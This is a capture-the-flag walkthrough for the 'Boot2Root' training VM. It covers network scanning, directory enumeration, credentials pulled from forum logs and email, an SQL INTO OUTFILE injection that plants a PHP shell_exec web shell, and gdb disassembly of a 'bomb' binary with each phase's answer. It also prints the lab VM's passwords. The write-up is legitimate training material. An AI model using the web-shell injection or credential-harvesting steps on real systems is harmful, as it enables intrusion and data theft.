# Boot2Root
This project is an introduction to the penetration of a system.

--------------------------------------------------------------------------

Step by step guide

--------------------------------------------------------------------------

## We need to fine the IP address of our VM

```ifconfig```

And get something like that:
```vmnet8: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	ether 00:50:56:c0:00:08
	inet 192.168.152.1 netmask 0xffffff00 broadcast 192.168.152.255
```
(there may be more than 1 vm)

Then use nmap to scan this IP

```nmap 192.168.152.1-255```

And get

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-05 15:43 EET
Nmap scan report for 192.168.152.1
Host is up (0.00015s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 192.168.152.130
Host is up (0.00083s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 255 IP addresses (2 hosts up) scanned in 28.91 seconds
```
Take the machine with the most open ports.
Our case is ```192.168.152.130```

## Looking for credentials

Install Dirb software
```
git clone https://github.com/v0re/dirb.git
cd dirb/
./configure
make
```
Scan our URL

```
./dirb https://192.168.152.130/ wordlists/common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Jan  5 15:53:37 2019
URL_BASE: https://192.168.152.130/
WORDLIST_FILES: wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.152.130/ ----
+ https://192.168.152.130/cgi-bin/ (CODE:403|SIZE:292)
==> DIRECTORY: https://192.168.152.130/forum/
==> DIRECTORY: https://192.168.152.130/phpmyadmin/
+ https://192.168.152.130/server-status (CODE:403|SIZE:297)
==> DIRECTORY: https://192.168.152.130/webmail/
```
phpmyadmin and webmail needs credentials.

## Forum

Research the forum and find 'Probleme login ?' topic, it's logs
Check who log in. Find this:
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```
we suppose that someone put password to login field and then, after couple seconds successfully loged in

So, we try this cred to login the forum ```lmezard/!q\]Ej?*5K5cy*AJ```

Boom! We're here!

## Webmail

We can find email address on foroum for webmail. It's ```laurie@borntosec.net```.

Try this email and same password. It's works!

In there we find the letter with "DB Access" title. And get credentials ```root/Fg-'kKXBj87E:aJ$``` from letter.


## phpMyAdmin

Use this credentials to login phpmyadmin and it's works!

The injection sql ```select "<?php $output = shell_exec('cat /home/LOOKATME/password'); echo $output ?>" into outfile "/var/www/forum/templates_c/tmp.php"```

Went to ```[ip]/forum/templates_c/tmp.php```

```lmezard:G!@M6f4Eatau{sF"```

## ftp

```brew install inetutils```
```ftp [YOUR IP]```
use lmezard:G!@M6f4Eatau{sF" credentials

```
get fun
get README
bye
```

get the README and fun file.
```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

```

login is ```laurie```

fun file it's a archive.

``` tar xf fun ```

It's a lot files with code, written in C.

Try to concatinate it with script.```node crackFunFile.js```

Compile the code.

Get the result:
```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%
```

Use sha256 online generator and get: ```330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4```

## ssh

Try connect via ssh ```ssh root@IPaddress```. In out case is:

```
ssh laurie@172.16.69.129
```

What we get:
```
laurie@BornToSecHackMe:~$ ls -la
total 37
drwxr-x--- 1 laurie   laurie    80 Dec 23 18:27 .
drwxrwx--x 1 www-data root      60 Oct 13  2015 ..
-rwxr-x--- 1 laurie   laurie   432 Dec 23 18:30 .bash_history
-rwxr-x--- 1 laurie   laurie   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 laurie   laurie  3489 Oct 13  2015 .bashrc
drwx------ 2 laurie   laurie    43 Oct 15  2015 .cache
-rwxr-x--- 1 laurie   laurie   675 Oct  8  2015 .profile
drwx------ 2 laurie   laurie    60 Dec 23 18:28 .ssh
-rw------- 1 laurie   laurie   606 Oct 13  2015 .viminfo
-rwxr-x--- 1 laurie   laurie   158 Oct  8  2015 README
-rwxr-x--- 1 laurie   laurie 26943 Oct  8  2015 bomb
```

Get the files:
```
scp laurie@172.16.69.129:bomb .
scp laurie@172.16.69.129:README .
```

README file:
```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

https://ru.wikibooks.org/wiki/%D0%90%D1%81%D1%81%D0%B5%D0%BC%D0%B1%D0%BB%D0%B5%D1%80_%D0%B2_Linux_%D0%B4%D0%BB%D1%8F_%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%81%D1%82%D0%BE%D0%B2_C

1. $ gdb bomb

2. disassemble main
You can see here functions phase_1 ... _6
and phase_defused
2. Paste breakpoints
```$ break phase_1
...
$ break phase_6
```
3. Disassemble phase_1
```
$ disassemble phase_1

$ x/s  0x80497c0 const "Public speaking is very easy."

0x08048b20 <+0>:	push   %ebp  			; save register on stack
0x08048b21 <+1>:	mov    %esp,%ebp		; move esp into ebp
0x08048b23 <+3>:	sub    $0x8,%esp
0x08048b26 <+6>:	mov    0x8(%ebp),%eax
0x08048b29 <+9>:	add    $0xfffffff8,%esp
0x08048b2c <+12>:	push   $0x80497c0		; save pointer to string on stack
0x08048b31 <+17>:	push   %eax				; save argument on stack
0x08048b32 <+18>:	call   0x8049030 <strings_not_equal> ; call func 
0x08048b37 <+23>:	add    $0x10,%esp
0x08048b3a <+26>:	test   %eax,%eax
0x08048b3c <+28>:	je     0x8048b43 <phase_1+35>
0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
0x08048b43 <+35>:	mov    %ebp,%esp
0x08048b45 <+37>:	pop    %ebp
0x08048b46 <+38>:	ret
```

Just compare string and if they are equal pass to next phase

**ANSWER:** Public speaking is very easy.

4. Disassemble phase_2
```
   0x08048b48 <+0>:	push   %ebp
   0x08048b49 <+1>:	mov    %esp,%ebp
   0x08048b4b <+3>:	sub    $0x20,%esp
   0x08048b4e <+6>:	push   %esi
   0x08048b4f <+7>:	push   %ebx
   0x08048b50 <+8>:	mov    0x8(%ebp),%edx
   0x08048b53 <+11>:	add    $0xfffffff8,%esp
   0x08048b56 <+14>:	lea    -0x18(%ebp),%eax
   0x08048b59 <+17>:	push   %eax
   0x08048b5a <+18>:	push   %edx
   0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
   0x08048b60 <+24>:	add    $0x10,%esp
   0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)
   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:	mov    $0x1,%ebx
   0x08048b73 <+43>:	lea    -0x18(%ebp),%esi
   0x08048b76 <+46>:	lea    0x1(%ebx),%eax
   0x08048b79 <+49>:	imul   -0x4(%esi,%ebx,4),%eax
   0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:	inc    %ebx
   0x08048b89 <+65>:	cmp    $0x5,%ebx
   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
   0x08048b8e <+70>:	lea    -0x28(%ebp),%esp
   0x08048b91 <+73>:	pop    %ebx
   0x08048b92 <+74>:	pop    %esi
   0x08048b93 <+75>:	mov    %ebp,%esp
   0x08048b95 <+77>:	pop    %ebp
   0x08048b96 <+78>:	ret
```
```

0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>   ; read numbers from keyboard
0x08048b60 <+24>:	add    $0x10,%esp 					
0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)				; compare first argumt with 1, if it is not equal than KO
0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>		; 
0x08048b69 <+33>:	call   0x80494fc <explode_bomb>		;
0x08048b6e <+38>:	mov    $0x1,%ebx					; ebx is counter, set it to 1
0x08048b73 <+43>:	lea    -0x18(%ebp),%esi				; esi = 1st argument
0x08048b76 <+46>:	lea    0x1(%ebx),%eax				; eax = ebx + 1
0x08048b79 <+49>:	imul   -0x4(%esi,%ebx,4),%eax		; eax = (ebx * 4) + esi - 4
0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)			; compare eax and (ebx * 4) + esi
0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>		; got to  + 64 if equal
0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
				                                        ; each next number must be equal to current number multiplied by next position
0x08048b88 <+64>:	inc    %ebx							; inc ebx
0x08048b89 <+65>:	cmp    $0x5,%ebx					; back to 46 line if ebx is less or equal to 46
0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46> 

subl -0x20(%ebx,%ecx,0x4),%eax (AT&T)  #  EAX = (ECX * 4) + EBX - 32
```

**ANSWER:** ```1 2 6 24 120 720```

5. Disassemble phase_3
Dump of assembler code for function phase_3:

```
0x08048b98 <+0>:	push   %ebp
0x08048b99 <+1>:	mov    %esp,%ebp
0x08048b9b <+3>:	sub    $0x14,%esp
0x08048b9e <+6>:	push   %ebx
0x08048b9f <+7>:	mov    0x8(%ebp),%edx
0x08048ba2 <+10>:	add    $0xfffffff4,%esp
0x08048ba5 <+13>:	lea    -0x4(%ebp),%eax
0x08048ba8 <+16>:	push   %eax
0x08048ba9 <+17>:	lea    -0x5(%ebp),%eax
0x08048bac <+20>:	push   %eax
0x08048bad <+21>:	lea    -0xc(%ebp),%eax
0x08048bb0 <+24>:	push   %eax
0x08048bb1 <+25>:	push   $0x80497de
0x08048bb6 <+30>:	push   %edx
0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>
0x08048bbc <+36>:	add    $0x20,%esp
0x08048bbf <+39>:	cmp    $0x2,%eax
0x08048bc2 <+42>:	jg     0x8048bc9 <phase_3+49>
0x08048bc4 <+44>:	call   0x80494fc <explode_bomb>
0x08048bc9 <+49>:	cmpl   $0x7,-0xc(%ebp)
0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
0x08048bd3 <+59>:	mov    -0xc(%ebp),%eax
0x08048bd6 <+62>:	jmp    *0x80497e8(,%eax,4)
0x08048bdd <+69>:	lea    0x0(%esi),%esi
0x08048be0 <+72>:	mov    $0x71,%bl
0x08048be2 <+74>:	cmpl   $0x309,-0x4(%ebp)
0x08048be9 <+81>:	je     0x8048c8f <phase_3+247>
0x08048bef <+87>:	call   0x80494fc <explode_bomb>
0x08048bf4 <+92>:	jmp    0x8048c8f <phase_3+247>
0x08048bf9 <+97>:	lea    0x0(%esi,%eiz,1),%esi
0x08048c00 <+104>:	mov    $0x62,%bl
0x08048c02 <+106>:	cmpl   $0xd6,-0x4(%ebp)
0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
0x08048c14 <+124>:	jmp    0x8048c8f <phase_3+247>
0x08048c16 <+126>:	mov    $0x62,%bl
0x08048c18 <+128>:	cmpl   $0x2f3,-0x4(%ebp)
0x08048c1f <+135>:	je     0x8048c8f <phase_3+247>
0x08048c21 <+137>:	call   0x80494fc <explode_bomb>
0x08048c26 <+142>:	jmp    0x8048c8f <phase_3+247>
0x08048c28 <+144>:	mov    $0x6b,%bl
0x08048c2a <+146>:	cmpl   $0xfb,-0x4(%ebp)
0x08048c31 <+153>:	je     0x8048c8f <phase_3+247>
0x08048c33 <+155>:	call   0x80494fc <explode_bomb>
0x08048c38 <+160>:	jmp    0x8048c8f <phase_3+247>
0x08048c3a <+162>:	lea    0x0(%esi),%esi
0x08048c40 <+168>:	mov    $0x6f,%bl
0x08048c42 <+170>:	cmpl   $0xa0,-0x4(%ebp)
0x08048c49 <+177>:	je     0x8048c8f <phase_3+247>
0x08048c4b <+179>:	call   0x80494fc <explode_bomb>
0x08048c50 <+184>:	jmp    0x8048c8f <phase_3+247>
0x08048c52 <+186>:	mov    $0x74,%bl
0x08048c54 <+188>:	cmpl   $0x1ca,-0x4(%ebp)
0x08048c5b <+195>:	je     0x8048c8f <phase_3+247>
0x08048c5d <+197>:	call   0x80494fc <explode_bomb>
0x08048c62 <+202>:	jmp    0x8048c8f <phase_3+247>
0x08048c64 <+204>:	mov    $0x76,%bl
0x08048c66 <+206>:	cmpl   $0x30c,-0x4(%ebp)
0x08048c6d <+213>:	je     0x8048c8f <phase_3+247>
0x08048c6f <+215>:	call   0x80494fc <explode_bomb>
0x08048c74 <+220>:	jmp    0x8048c8f <phase_3+247>
0x08048c76 <+222>:	mov    $0x62,%bl
0x08048c78 <+224>:	cmpl   $0x20c,-0x4(%ebp)
0x08048c7f <+231>:	je     0x8048c8f <phase_3+247>
0x08048c81 <+233>:	call   0x80494fc <explode_bomb>
0x08048c86 <+238>:	jmp    0x8048c8f <phase_3+247>
0x08048c88 <+240>:	mov    $0x78,%bl
0x08048c8a <+242>:	call   0x80494fc <explode_bomb>
0x08048c8f <+247>:	cmp    -0x5(%ebp),%bl
0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
0x08048c99 <+257>:	mov    -0x18(%ebp),%ebx
0x08048c9c <+260>:	mov    %ebp,%esp
0x08048c9e <+262>:	pop    %ebp
0x08048c9f <+263>:	ret
```

Look at README, it contains a hint

```
ebp + с 1st arg
ebp + 5 2nd
ebp + 4 3rd 


0x80497de ====== "%d %c %d"
Means we must enter number, char, number.

0x08048bbf <+39>:	cmp    $0x2,%eax
0x08048bc2 <+42>:	jg     0x8048bc9 <phase_3+49>
If you pass 2 arguments or less, than KO

0x08048bd3 <+59>:	mov    -0xc(%ebp),%eax
0x08048bd6 <+62>:	jmp    *0x80497e8(,%eax,4)
EAX contains 1st arguments
Swith case by it

Target case:
0x08048c00 <+104>:	mov    $0x62,%bl
0x08048c02 <+106>:	cmpl   $0xd6,-0x4(%ebp)
0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
0x08048c14 <+124>:	jmp    0x8048c8f <phase_3+247>
...
0x08048c8f <+247>:	cmp    -0x5(%ebp),%bl
0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
0x08048c99 <+257>:	mov    -0x18(%ebp),%ebx
0x08048c9c <+260>:	mov    %ebp,%esp
0x08048c9e <+262>:	pop    %ebp
0x08048c9f <+263>:	ret
```

**ANSWER:** ```1 b 214```




6. Disassemble phase_4
```
Dump of assembler code for function phase_4:
0x08048ce0 <+0>:	push   %ebp
0x08048ce1 <+1>:	mov    %esp,%ebp
0x08048ce3 <+3>:	sub    $0x18,%esp
0x08048ce6 <+6>:	mov    0x8(%ebp),%edx
0x08048ce9 <+9>:	add    $0xfffffffc,%esp
0x08048cec <+12>:	lea    -0x4(%ebp),%eax
0x08048cef <+15>:	push   %eax
0x08048cf0 <+16>:	push   $0x8049808
0x08048cf5 <+21>:	push   %edx
0x08048cf6 <+22>:	call   0x8048860 <sscanf@plt>
0x08048cfb <+27>:	add    $0x10,%esp
0x08048cfe <+30>:	cmp    $0x1,%eax				; if entered notheng, than KO
0x08048d01 <+33>:	jne    0x8048d09 <phase_4+41>
0x08048d03 <+35>:	cmpl   $0x0,-0x4(%ebp)			; if entered number is bigger than 0, than OK
0x08048d07 <+39>:	jg     0x8048d0e <phase_4+46>
0x08048d09 <+41>:	call   0x80494fc <explode_bomb>
0x08048d0e <+46>:	add    $0xfffffff4,%esp
0x08048d11 <+49>:	mov    -0x4(%ebp),%eax
0x08048d14 <+52>:	push   %eax
0x08048d15 <+53>:	call   0x8048ca0 <func4>
0x08048d1a <+58>:	add    $0x10,%esp
0x08048d1d <+61>:	cmp    $0x37,%eax				; if func4 return 0x37, than OK
0x08048d20 <+64>:	je     0x8048d27 <phase_4+71>
0x08048d22 <+66>:	call   0x80494fc <explode_bomb>
0x08048d27 <+71>:	mov    %ebp,%esp
0x08048d29 <+73>:	pop    %ebp
0x08048d2a <+74>:	ret    
End of assembler dump.
```
Contains bonus pasrt

```
Dump of assembler code for function func4:
0x08048ca0 <+0>:	push   %ebp
0x08048ca1 <+1>:	mov    %esp,%ebp
0x08048ca3 <+3>:	sub    $0x10,%esp
0x08048ca6 <+6>:	push   %esi
0x08048ca7 <+7>:	push   %ebx
0x08048ca8 <+8>:	mov    0x8(%ebp),%ebx			; in ebx argument, in eax function passed argument
0x08048cab <+11>:	cmp    $0x1,%ebx
0x08048cae <+14>:	jle    0x8048cd0 <func4+48>		; erg less then 1, return 1
0x08048cb0 <+16>:	add    $0xfffffff4,%esp
0x08048cb3 <+19>:	lea    -0x1(%ebx),%eax			; eax = (ebx - 1) 
0x08048cb6 <+22>:	push   %eax						; pass arg and call func
0x08048cb7 <+23>:	call   0x8048ca0 <func4>
0x08048cbc <+28>:	mov    %eax,%esi
0x08048cbe <+30>:	add    $0xfffffff4,%esp
0x08048cc1 <+33>:	lea    -0x2(%ebx),%eax
0x08048cc4 <+36>:	push   %eax
0x08048cc5 <+37>:	call   0x8048ca0 <func4>
0x08048cca <+42>:	add    %esi,%eax
0x08048ccc <+44>:	jmp    0x8048cd5 <func4+53>
0x08048cce <+46>:	mov    %esi,%esi
0x08048cd0 <+48>:	mov    $0x1,%eax
0x08048cd5 <+53>:	lea    -0x18(%ebp),%esp
0x08048cd8 <+56>:	pop    %ebx
0x08048cd9 <+57>:	pop    %esi
0x08048cda <+58>:	mov    %ebp,%esp
0x08048cdc <+60>:	pop    %ebp
0x08048cdd <+61>:	ret    
End of assembler dump.
```
**ANSWER:** ```9```



7. Disassemble phase_5
```
Dump of assembler code for function phase_5:
0x08048d2c <+0>:	push   %ebp
0x08048d2d <+1>:	mov    %esp,%ebp
0x08048d2f <+3>:	sub    $0x10,%esp
0x08048d32 <+6>:	push   %esi
0x08048d33 <+7>:	push   %ebx
0x08048d34 <+8>:	mov    0x8(%ebp),%ebx
0x08048d37 <+11>:	add    $0xfffffff4,%esp
0x08048d3a <+14>:	push   %ebx
0x08048d3b <+15>:	call   0x8049018 <string_length>
0x08048d40 <+20>:	add    $0x10,%esp
0x08048d43 <+23>:	cmp    $0x6,%eax
0x08048d46 <+26>:	je     0x8048d4d <phase_5+33>
0x08048d48 <+28>:	call   0x80494fc <explode_bomb>
0x08048d4d <+33>:	xor    %edx,%edx				; edx = 0
0x08048d4f <+35>:	lea    -0x8(%ebp),%ecx
0x08048d52 <+38>:	mov    $0x804b220,%esi
0x08048d57 <+43>:	mov    (%edx,%ebx,1),%al
0x08048d5a <+46>:	and    $0xf,%al
0x08048d5c <+48>:	movsbl %al,%eax
0x08048d5f <+51>:	mov    (%eax,%esi,1),%al
0x08048d62 <+54>:	mov    %al,(%edx,%ecx,1)
0x08048d65 <+57>:	inc    %edx
0x08048d66 <+58>:	cmp    $0x5,%edx
0x08048d69 <+61>:	jle    0x8048d57 <phase_5+43>
0x08048d6b <+63>:	movb   $0x0,-0x2(%ebp)
0x08048d6f <+67>:	add    $0xfffffff8,%esp
0x08048d72 <+70>:	push   $0x804980b
0x08048d77 <+75>:	lea    -0x8(%ebp),%eax
0x08048d7a <+78>:	push   %eax
0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>
0x08048d80 <+84>:	add    $0x10,%esp
0x08048d83 <+87>:	test   %eax,%eax
0x08048d85 <+89>:	je     0x8048d8c <phase_5+96>
0x08048d87 <+91>:	call   0x80494fc <explode_bomb>
0x08048d8c <+96>:	lea    -0x18(%ebp),%esp
0x08048d8f <+99>:	pop    %ebx
0x08048d90 <+100>:	pop    %esi
0x08048d91 <+101>:	mov    %ebp,%esp
0x08048d93 <+103>:	pop    %ebp
0x08048d94 <+104>:	ret    
End of assembler dump.
```

Length of entered string must be 6
```
0x08048d3b <+15>:	call   0x8049018 <string_length>
0x08048d40 <+20>:	add    $0x10,%esp
0x08048d43 <+23>:	cmp    $0x6,%eax
```
```
$ x/s 0x804980b
0x804980b:	 "giants"

$ x/s 0x804b220
0x804b220 <array.123>:	 "isrveawhobpnutfg\260\001"

Making pattern
 abcdefghijklmno
pqrstuvwxyz
----------------
isrveawhobpnutfg

0x08048d4f <+35>:	lea    -0x8(%ebp),%ecx
0x08048d52 <+38>:	mov    $0x804b220,%esi
0x08048d57 <+43>:	mov    (%edx,%ebx,1),%al
0x08048d5a <+46>:	and    $0xf,%al
0x08048d5c <+48>:	movsbl %al,%eax
0x08048d5f <+51>:	mov    (%eax,%esi,1),%al
0x08048d62 <+54>:	mov    %al,(%edx,%ecx,1)
0x08048d65 <+57>:	inc    %edx
0x08048d66 <+58>:	cmp    $0x5,%edx
0x08048d69 <+61>:	jle    0x8048d57 <phase_5+43>

Replace entered string by this pattern
str[i] = isrvea..[str[i] & 0xf]
```

**ANSWER:** ```opekmq```


7. Disassemble phase_6
```
Dump of assembler code for function phase_6:
0x08048d98 <+0>:	push   %ebp
0x08048d99 <+1>:	mov    %esp,%ebp
0x08048d9b <+3>:	sub    $0x4c,%esp
0x08048d9e <+6>:	push   %edi
0x08048d9f <+7>:	push   %esi
0x08048da0 <+8>:	push   %ebx
0x08048da1 <+9>:	mov    0x8(%ebp),%edx
0x08048da4 <+12>:	movl   $0x804b26c,-0x34(%ebp)
0x08048dab <+19>:	add    $0xfffffff8,%esp
0x08048dae <+22>:	lea    -0x18(%ebp),%eax
0x08048db1 <+25>:	push   %eax
0x08048db2 <+26>:	push   %edx
0x08048db3 <+27>:	call   0x8048fd8 <read_six_numbers>
0x08048db8 <+32>:	xor    %edi,%edi
0x08048dba <+34>:	add    $0x10,%esp
0x08048dbd <+37>:	lea    0x0(%esi),%esi
0x08048dc0 <+40>:	lea    -0x18(%ebp),%eax
0x08048dc3 <+43>:	mov    (%eax,%edi,4),%eax
0x08048dc6 <+46>:	dec    %eax
0x08048dc7 <+47>:	cmp    $0x5,%eax
0x08048dca <+50>:	jbe    0x8048dd1 <phase_6+57>
0x08048dcc <+52>:	call   0x80494fc <explode_bomb>
0x08048dd1 <+57>:	lea    0x1(%edi),%ebx
0x08048dd4 <+60>:	cmp    $0x5,%ebx
0x08048dd7 <+63>:	jg     0x8048dfc <phase_6+100>
0x08048dd9 <+65>:	lea    0x0(,%edi,4),%eax
0x08048de0 <+72>:	mov    %eax,-0x38(%ebp)
0x08048de3 <+75>:	lea    -0x18(%ebp),%esi
0x08048de6 <+78>:	mov    -0x38(%ebp),%edx
0x08048de9 <+81>:	mov    (%edx,%esi,1),%eax
0x08048dec <+84>:	cmp    (%esi,%ebx,4),%eax
0x08048def <+87>:	jne    0x8048df6 <phase_6+94>
0x08048df1 <+89>:	call   0x80494fc <explode_bomb>
0x08048df6 <+94>:	inc    %ebx
0x08048df7 <+95>:	cmp    $0x5,%ebx
0x08048dfa <+98>:	jle    0x8048de6 <phase_6+78>
0x08048dfc <+100>:	inc    %edi
0x08048dfd <+101>:	cmp    $0x5,%edi
0x08048e00 <+104>:	jle    0x8048dc0 <phase_6+40>
0x08048e02 <+106>:	xor    %edi,%edi
0x08048e04 <+108>:	lea    -0x18(%ebp),%ecx
0x08048e07 <+111>:	lea    -0x30(%ebp),%eax
0x08048e0a <+114>:	mov    %eax,-0x3c(%ebp)
0x08048e0d <+117>:	lea    0x0(%esi),%esi
0x08048e10 <+120>:	mov    -0x34(%ebp),%esi
0x08048e13 <+123>:	mov    $0x1,%ebx
0x08048e18 <+128>:	lea    0x0(,%edi,4),%eax
0x08048e1f <+135>:	mov    %eax,%edx
0x08048e21 <+137>:	cmp    (%eax,%ecx,1),%ebx
0x08048e24 <+140>:	jge    0x8048e38 <phase_6+160>
0x08048e26 <+142>:	mov    (%edx,%ecx,1),%eax
0x08048e29 <+145>:	lea    0x0(%esi,%eiz,1),%esi
0x08048e30 <+152>:	mov    0x8(%esi),%esi
0x08048e33 <+155>:	inc    %ebx
0x08048e34 <+156>:	cmp    %eax,%ebx
0x08048e36 <+158>:	jl     0x8048e30 <phase_6+152>
0x08048e38 <+160>:	mov    -0x3c(%ebp),%edx
0x08048e3b <+163>:	mov    %esi,(%edx,%edi,4)
0x08048e3e <+166>:	inc    %edi
0x08048e3f <+167>:	cmp    $0x5,%edi
0x08048e42 <+170>:	jle    0x8048e10 <phase_6+120>
0x08048e44 <+172>:	mov    -0x30(%ebp),%esi
0x08048e47 <+175>:	mov    %esi,-0x34(%ebp)
0x08048e4a <+178>:	mov    $0x1,%edi
0x08048e4f <+183>:	lea    -0x30(%ebp),%edx
0x08048e52 <+186>:	mov    (%edx,%edi,4),%eax
0x08048e55 <+189>:	mov    %eax,0x8(%esi)
0x08048e58 <+192>:	mov    %eax,%esi
0x08048e5a <+194>:	inc    %edi
0x08048e5b <+195>:	cmp    $0x5,%edi
0x08048e5e <+198>:	jle    0x8048e52 <phase_6+186>
0x08048e60 <+200>:	movl   $0x0,0x8(%esi)
0x08048e67 <+207>:	mov    -0x34(%ebp),%esi
0x08048e6a <+210>:	xor    %edi,%edi
0x08048e6c <+212>:	lea    0x0(%esi,%eiz,1),%esi
0x08048e70 <+216>:	mov    0x8(%esi),%edx
0x08048e73 <+219>:	mov    (%esi),%eax
0x08048e75 <+221>:	cmp    (%edx),%eax
0x08048e77 <+223>:	jge    0x8048e7e <phase_6+230>
0x08048e79 <+225>:	call   0x80494fc <explode_bomb>
0x08048e7e <+230>:	mov    0x8(%esi),%esi
0x08048e81 <+233>:	inc    %edi
0x08048e82 <+234>:	cmp    $0x4,%edi
0x08048e85 <+237>:	jle    0x8048e70 <phase_6+216>
0x08048e87 <+239>:	lea    -0x58(%ebp),%esp
0x08048e8a <+242>:	pop    %ebx
0x08048e8b <+243>:	pop    %esi
0x08048e8c <+244>:	pop    %edi
0x08048e8d <+245>:	mov    %ebp,%esp
0x08048e8f <+247>:	pop    %ebp
0x08048e90 <+248>:	ret    
End of assembler dump.
```

Read 6 numbers
Check if they are not equal to each other
Sort array by this numbers

**ANSWER:** ```4 2 6 3 1 5```


After this, concatenate all passwords and remove spaces

This one is not right
```Publicspeakingisveryeasy.126241207201b2149opekmq426315```

Look at forum, and find answer
```Publicspeakingisveryeasy.126241207201b2149opekmq426135```
